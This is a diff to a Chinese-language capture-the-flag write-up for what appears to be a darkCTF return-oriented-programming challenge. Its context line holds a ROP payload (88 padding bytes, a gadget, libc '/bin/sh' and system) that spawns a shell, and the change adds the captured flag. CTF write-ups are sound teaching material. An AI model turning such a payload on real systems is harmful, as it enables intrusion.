@@ -44,4 +44,7 @@ payload = b'A'*88 + p64(gadget2) + p64(libc_binsh) + p64(libc_system)
 ```
 由於不會再呼叫其他library function,所以有沒有stack align都沒有關係,但如果之後還要再呼叫function就必須做align,不然會出錯.
 
-執行exploit.py得到flag.
+執行exploit.py得到flag:
+```
+darkCTF{y0u_r0p_r0p_4nd_w0n}
+```
